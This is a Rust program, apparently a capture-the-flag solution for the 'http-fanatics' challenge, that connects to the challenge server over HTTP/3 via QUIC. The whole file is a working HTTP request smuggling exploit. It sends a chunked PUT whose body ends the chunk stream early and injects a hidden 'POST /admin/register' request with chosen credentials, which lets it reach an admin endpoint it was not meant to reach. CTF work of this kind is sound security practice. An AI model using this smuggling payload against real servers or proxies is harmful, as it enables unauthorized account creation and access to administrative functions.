use std::sync::Arc;
use bytes::Bytes;
use http::header::TRANSFER_ENCODING;
use http::Method;
use rustls::RootCertStore;

#[tokio::main]
async fn main() {
    let mut roots = RootCertStore::empty();
    for cert in rustls_native_certs::load_native_certs().unwrap() {
        roots.add(&rustls::Certificate(cert.to_vec())).unwrap();
    }

    let mut tls_config = rustls::ClientConfig::builder()
        .with_safe_default_cipher_suites()
        .with_safe_default_kx_groups()
        .with_protocol_versions(&[&rustls::version::TLS13])
        .unwrap()
        .with_root_certificates(roots)
        .with_no_client_auth();
    tls_config.alpn_protocols = vec!["h3".as_bytes().to_vec()];

    let mut client_endpoint = quinn::Endpoint::client("0.0.0.0:0".parse().unwrap())
        .unwrap();

    let client_config = quinn::ClientConfig::new(Arc::new(tls_config));
    client_endpoint.set_default_client_config(client_config);

    let conn = client_endpoint.connect("97.107.133.131:443".parse().unwrap(), "http-fanatics.challs.umdctf.io")
        .unwrap().await
        .unwrap();

    let quinn_conn = h3_quinn::Connection::new(conn);

    let (mut driver, mut send_request) = h3::client::new(quinn_conn).await.unwrap();

    let drive = async move {
        std::future::poll_fn(|cx| driver.poll_close(cx)).await?;
        Ok::<(), Box<dyn std::error::Error>>(())
    };

    let request = async move {
        let request = http::Request::builder().uri("https://http-fanatics.challs.umdctf.io:443/put")
            .method(Method::PUT)
            .header(TRANSFER_ENCODING, "chunked")
            .body(())?;

        let mut stream = send_request.send_request(request).await?;

        let body = Bytes::from("0\r\n\r\nPOST /admin/register HTTP/1.1\r\nHost: http-fanatics.challs.umdctf.io:443\r\nContent-Length: 36\r\nContent-Type: application/json\r\n\r\n{\"username\":\"bob\",\"password\":\"bob2\"}");
        stream.send_data(body).await?;
        stream.finish().await?;

        stream.recv_response().await?;

        Ok::<_, Box<dyn std::error::Error>>(())
    };

    let (request_result, drive_result) = tokio::join!(request, drive);
    request_result.unwrap();
    drive_result.unwrap();

    client_endpoint.wait_idle().await;
}
